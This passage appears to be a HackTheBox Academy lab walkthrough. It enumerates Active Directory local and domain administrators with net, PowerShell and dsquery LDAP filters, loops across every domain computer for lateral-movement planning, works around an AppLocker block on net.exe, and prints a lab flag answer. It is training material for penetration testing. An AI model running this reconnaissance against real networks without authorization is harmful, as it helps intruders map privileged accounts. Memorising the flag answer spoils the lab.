-   In the format `DOMAIN\username` (lowercase, looks like a person's account)
-   NOT a known group name like "Domain Admins," "Enterprise Admins," etc.

powershell

```
Get-LocalGroupMember -Group "Administrators" | Where-Object {$_.ObjectClass -eq "User" -and $_.PrincipalSource -eq "ActiveDirectory"}
```

This filters to show ONLY domain users (not domain groups, not local accounts).

🔴 What If #2: The command works but you're unsure if it's a user or a group?

**Scenario:** You see `INLANEFREIGHT\IT_Helpdesk_Admins` — is that a user or a group?

**Solution:** Query it directly:

cmd

```
net user IT_Helpdesk_Admins /domain
```

If it returns user details (Last Login, Password Last Set, etc.) → it's a user.  
If it says `The user name could not be found` → it's a group. Then try:

cmd

```
net group IT_Helpdesk_Admins /domain
```

🔴 What If #3: You need to check local admins on a REMOTE machine?

**Scenario:** You want to check local admins on another machine on the network, not the one you're on.

**Solution:**

cmd

```
net localgroup administrators \\COMPUTERNAME
```

Or with PowerShell:

powershell

```
Invoke-Command -ComputerName ACADEMY-EA-MS01 -ScriptBlock {Get-LocalGroupMember -Group "Administrators"}
```

This uses PowerShell Remoting (WinRM) to run the command on a remote machine.

🔴 What If #4: You need to enumerate local admins across ALL domain computers?

**Scenario:** You want to find which domain user is a local admin on every machine (for lateral movement planning).

**Solution:** Combine domain computer enumeration with local group queries:

powershell

```
$computers = (net group "Domain Computers" /domain) | Select-String "\$"
foreach ($computer in $computers) {
    $name = $computer.ToString().Trim().TrimEnd('$')
    Write-Host "=== $name ===" 
    net localgroup administrators \\$name 2>$null
}
```

This iterates through all domain computers and checks each one.

🔴 What If #5: net.exe is completely blocked by AppLocker?

**Scenario:** Every `net` command returns "This app has been blocked by your system administrator."

**Solution:** Use the pure PowerShell path that doesn't call `net.exe`:

powershell

```
([ADSI]"WinNT://./Administrators,group").Members() | 
    ForEach-Object { 
        $_.GetType().InvokeMember("AdsPath",'GetProperty',$null,$_,$null) 
    }
```

This uses the built-in .NET `ADSI` interface — no external binaries needed.

🔴 What If #6: The target is a Domain Controller (DC) itself?

**Scenario:** You've landed on a DC. `Get-LocalGroupMember` may behave differently because DCs don't truly have "local" groups — they use domain groups instead.

**Solution:** On a DC, query the Domain Admins group instead, since that's the effective equivalent:

cmd

```
net group "Domain Admins" /domain
```

Or check who can log on to the DC via GPO:

cmd

```
net localgroup "Administrators" /domain
```

DCs merge local and domain concepts, so the `Administrators` group on a DC actually refers to the domain `Builtin\Administrators` group.

# QUESTION 3: Find the Flag in a Disabled Admin Account's Description Field

---

## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### Re-stating Simply

In Active Directory, every user account has many fields — name, email, phone number, **description**, etc. Administrators sometimes accidentally (or for testing) put sensitive notes in the **description field**. Attackers know to check these fields.

You need to find:

1.  An account that is **disabled** (cannot be used to log in)
2.  That also has **administrative privileges**
3.  That has a **flag** (a text string like `HTB{...}`) in its description

### Why Disabled Admin Accounts are a Gold Mine

Think of it like a decommissioned security guard's badge that still has the master key code written on the back. The guard can't get in anymore (disabled), but if you find that badge (description), you have the code.

### The Hacker's Mindset

This requires **LDAP filtering** — asking Active Directory very specific questions using a query language. We need to combine TWO filters:

-   Filter 1: Account is **disabled** (UAC bit value 2 = `ACCOUNTDISABLE`)
-   Filter 2: Account is in an **admin group** OR has admin-level UAC flags

The **hint** says to use `DSQuery` with LDAP filters.

### Core Justification

`dsquery *` with a combined LDAP filter lets us search for multiple attributes simultaneously without needing external tools. The UAC value for a disabled account is **2** (`0x0002`), and we combine it with membership checks.

---

## 2\. SIX DISTINCT SOLUTION APPROACHES

### 🔵 Approach 1 — DSQuery with Disabled + Admin Group Filter (Hint Method)

**Command:**

cmd

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr sAMAccountName description userAccountControl
```

**Breaking down this command:**

Part

Meaning

`dsquery *`

Search all AD objects

`objectCategory=person`

It's a person (not a computer)

`objectClass=user`

It's a user account

`userAccountControl:1.2.840.113556.1.4.803:=2`

UAC bit 2 is set = account is **disabled**

`adminCount=1`

The `adminCount` attribute = 1 marks accounts protected by AdminSDHolder (meaning they have/had admin group membership)

`-attr sAMAccountName description`

Show us the username AND the description field

**Expected Output:**

```
sAMAccountName    description                      userAccountControl
---------------   --------------------------------  ------------------
svc_backupadm    HTB{L00k_1n_th3_d3scr1pt10n}     514
```

The **flag is in the description column**.

**Failure Scenarios:**

-   `dsquery` not available (not installed)
-   Running without domain connectivity
-   `adminCount` may not be set on all admin accounts

**Pivot Trigger:**  
If `dsquery` is not recognized, move to Approach 2.

---

### 🔵 Approach 2 — DSQuery Search All Disabled Users (Broader Net)

**Command:**

cmd

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr sAMAccountName description memberOf
```

**Expected Output:**

```

-----------      ---------------------------------  --------
Guest            Built-in account for guest...      
svc_backupadm    HTB{L00k_1n_th3_d3scr1pt10n}      CN=Administrators,CN=Builtin,...
krbtgt           Key Distribution Center Service    CN=Denied RODC Password...
```

**Why broader?** Some accounts may have admin privileges but not have `adminCount=1` set (it can lag or be manually cleared). By pulling ALL disabled users and showing `memberOf`, you can visually identify admin group members.

**Failure Scenarios:**

-   Very large domains — might return hundreds of disabled accounts
-   `memberOf` output is long and hard to read without filtering

**Pivot Trigger:**  
If the output is too large or the description field shows nothing, move to Approach 3.

### 🔵 Approach 4 — PowerShell with DirectorySearcher (No Module Needed)

**Command:**

powershell

```
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))"
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","description"))
$results = $searcher.FindAll()
foreach ($result in $results) {
    $name = $result.Properties["sAMAccountName"]
    $desc = $result.Properties["description"]
    Write-Host "$name : $desc"
}
```

**Expected Output:**

```
svc_backupadm : HTB{L00k_1n_th3_d3scr1pt10n}
```

**Why this is powerful:** `System.DirectoryServices.DirectorySearcher` is a **.NET class built into Windows**. No modules, no external tools — just raw .NET talking directly to LDAP.

**Failure Scenarios:**

-   Script execution policy may block multi-line scripts

**Pivot Trigger:**  
If you get LDAP connection errors, move to Approach 5.

### 🔵 Approach 6 — DSGet Pipeline (Chained Query)

**Command:**

cmd

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" | dsget user -samid -desc
```

-   Piping behavior can be OS-version dependent

**Pivot Trigger:**

## 3\. THE "WHAT IF" MASTERCLASS

🔴 What If #1: No results come back from the dsquery filter?

**Scenario:** Your dsquery runs without error but returns zero results.

**Solution:** Broaden the search incrementally. Remove filters one at a time to understand which condition is too restrictive:

cmd

```
REM Step 1: Find ALL disabled users (no admin filter)
dsquery user -disabled

REM Step 2: Check if adminCount=1 exists on any user
dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr sAMAccountName

REM Step 3: Combine manually once you understand what's in the environment
```

This **debug-by-elimination** approach is fundamental to penetration testing.

🔴 What If #2: The description field shows up blank for all accounts?

**Scenario:** Your query returns accounts but the description is empty.

**Solution:** The flag might be in a **different field**. Active Directory users have many text fields:

powershell

```
Get-ADUser -Identity svc_backupadm -Properties * | 
    Select-Object SamAccountName, Description, Info, Comment, DisplayName, Office, Department
```

Common hiding spots for flags in AD:

-   `description`
-   `info` (Notes field in older AD tools)
-   `comment`
-   `displayName`
-   `homeDirectory`

🔴 What If #3: You don't know what the flag format looks like?

**Scenario:** You're not sure if you found the flag or just a regular description.

**Solution:** In HackTheBox labs, flags follow specific patterns:

-   Usually `HTB{...}` format
-   Sometimes a hash string or specific text mentioned in the question

If no `HTB{` pattern is visible, search ALL descriptions for any non-standard text:

powershell

```
Get-ADUser -Filter * -Properties Description | 
    Where-Object {$_.Description -ne $null -and $_.Description -notlike "Built-in*" -and $_.Description -notlike "Key Distribution*"} |
    Select-Object SamAccountName, Description
```

This removes common default descriptions and shows anything unusual.

🔴 What If #4: You need to search across an entire forest (multiple domains)?

**Scenario:** The target has a forest with child domains like `LOGISTICS.INLANEFREIGHT.LOCAL`. The account might be in a child domain.

**Solution:** Add the `-s` (server) flag to target a specific domain controller, or use the global catalog:

cmd

```
dsquery * -s ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr sAMAccountName description
```

Or for the Global Catalog (searches all domains at once, port 3268):

powershell

```
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"GC://INLANEFREIGHT.LOCAL")
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
```

🔴 What If #5: adminCount=1 doesn't catch all admin accounts?

**Scenario:** You believe there are admin accounts but `adminCount=1` returns nothing.

**Background:** `adminCount` is set by the **AdminSDHolder** process which runs every 60 minutes. A newly added admin might not have `adminCount=1` yet.

**Solution:** Instead, directly check group membership. Query disabled users who are members of known admin groups:

cmd

```
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(|(memberOf=CN=Administrators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL)(memberOf=CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)))" -attr sAMAccountName description
```

The `|` (OR operator) means: member of Administrators **OR** Domain Admins.

🔴 What If #6: You're on CPTS exam and need to do this quickly under time pressure?

**Scenario:** Real exam conditions — you need results fast.

**The Speed-Run Command** (combines everything into one shot):

cmd

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr sAMAccountName description userAccountControl memberOf -limit 0
```

-   `-limit 0` removes the default 100-result cap
-   Shows `memberOf` to confirm admin group membership
-   Shows `userAccountControl` to confirm the account is actually disabled (value should include **2** in its calculation, e.g., `514` = `512 Normal Account` + `2 Disabled`)

**UAC Math Example:** 512+2\=514 means a normal user account that is disabled. 512+2+65536\=66050 means a normal account, disabled, with "password never expires."
